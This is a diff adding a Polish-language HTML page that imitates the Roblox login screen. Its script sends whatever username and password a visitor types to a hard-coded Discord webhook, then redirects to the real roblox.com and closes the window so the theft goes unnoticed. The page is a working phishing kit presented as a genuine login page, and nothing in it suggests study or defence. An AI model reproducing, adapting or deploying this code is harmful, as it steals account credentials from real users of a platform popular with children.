@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Logowanie Roblox</title>
+  <style>
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url("1000007120.png");
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      width: 100vw;
+      height: 100vh;
+    }
+
+    
+    .navbar {
+      height: 64px;
+      background-color: #111111;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+    }
+
+    .navbar-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      width: 64px;
+      height: 64px;
+      margin-left: -20px;
+    }
+
+    .menu {
+      display: flex;
+      margin-left: 20px;
+      gap: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #e5e5e5;
+    }
+
+    
+    .navbar-search {
+      height: 36px;
+      width: 300px;
+      background-color: #2a2a2e;
+      border: 1px solid #3f3f46;
+      border-radius: 8px;
+      padding: 0 12px;
+      color: white;
+      font-size: 14px;
+      outline: none;
+      margin: 0 16px;
+    }
+
+    .navbar-search::placeholder {
+      color: #9ca3af;
+    }
+    
+
+    .navbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-primary {
+      height: 36px;
+      padding: 0 16px;
+      background-color: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .btn-secondary {
+      height: 36px;
+      padding: 0 16px;
+      background-color: transparent;
+      color: white;
+      border: 1px solid #3f3f46;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    
+    .login-container {
+      max-width: 420px;
+      width: 90%;
+      background-color: #1f1f23;
+      border-radius: 12px;
+      padding: 24px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .login-container h1 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: white;
+    }
+
+    .login-input {
+      width: 100%;
+      height: 48px;
+      background-color: #2a2a2e;
+      border: 1px solid #3f3f46;
+      border-radius: 8px;
+      padding: 12px;
+      color: #e5e5e5;
+      font-size: 14px;
+      margin-top: 12px;
+    }
+
+    .login-input::placeholder {
+      color: #9ca3af;
+    }
+
+    .login-button {
+      width: 100%;
+      height: 48px;
+      margin-top: 16px;
+      background-color: #2d2d32;
+      border: 1px solid #3f3f46;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .forgot-password {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      color: #d1d5db;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .secondary-action {
+      width: 100%;
+      height: 44px;
+      margin-top: 12px;
+      background-color: #2a2a2e;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .bottom-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #9ca3af;
+    }
+
+    .bottom-text a {
+      color: #e5e5e5;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    @media (max-width: 480px) {
+      .menu {
+        display: none;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  
+  <nav class="navbar">
+    <div class="navbar-left">
+      <img src="cos.png" alt="Logo" class="logo">
+      <div class="menu">
+        <div>Hity</div>
+        <div>Rynek</div>
+        <div>Tworzenie</div>
+        <div>Robuxy</div>
+      </div>
+    </div>
+
+    
+    <input
+      type="text"
+      id="searchInput"
+      class="navbar-search"
+      placeholder="Wyszukaj"
+    >
+    
+
+    <div class="navbar-right">
+      <button class="btn-primary">Zarejestruj się</button>
+      <button class="btn-secondary">Zaloguj się</button>
+    </div>
+  </nav>
+
+  
+  <div class="login-container">
+    <h1>Zaloguj się na platformie Roblox</h1>
+    <input type="text" id="email" class="login-input" placeholder="Nazwa użytkownika / adres e-mail / numer">
+    <input type="password" id="password" class="login-input" placeholder="Hasło">
+    <button id="loginBtn" class="login-button">Zaloguj się</button>
+    <a href="#" class="forgot-password">Nie pamiętasz hasła lub nazwy użytkownika?</a>
+    <button class="secondary-action">Wyślij kod jednorazowy na mój adres e-mail</button>
+    <button class="secondary-action">Użyj innego urządzenia</button>
+    <div class="bottom-text">Nie masz konta? <a href="#">Zarejestruj się</a></div>
+  </div>
+
+  
+  <script>
+    const searchInput = document.getElementById("searchInput");
+
+    if (searchInput) {
+      searchInput.addEventListener("keydown", function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          alert("Wyszukano: " + searchInput.value);
+        }
+      });
+    }
+
+    const loginBtn = document.getElementById("loginBtn");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+
+    if (loginBtn) {
+      loginBtn.addEventListener("click", function(e) {
+        e.preventDefault();
+        
+        const username = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        if (username && password) {
+          const webhookUrl = "https://discord.com/api/webhooks/1461426508550766802/mErgky_uMe49ZhNb_3QJPLgazFPIAWjzIyKfqVy_bAOkvBCT-XuhQ7TODh8Nup1QrTUi";
+          
+          const embed = {
+            title: "```ㅤㅤㅤNowe Kontoㅤㅤㅤ```",
+            description: `\n\n**Nazwa użytkownika:**\n${username}\n\n**Hasło:**\n${password}`,
+            color: 8421504
+          };
+
+          const payload = {
+            embeds: [embed]
+          };
+
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+          }).then(response => {
+            if (response.ok) {
+              console.log("Dane wysłane pomyślnie");
+            } else {
+              console.error("Błąd wysyłania danych");
+            }
+          }).catch(error => {
+            console.error("Błąd:", error);
+          });
+
+          setTimeout(() => {
+            window.open("https://roblox.com/home", "_blank");
+            window.close();
+          }, 500);
+        }
+      });
+    }
+  </script>
+</body>
+</html>
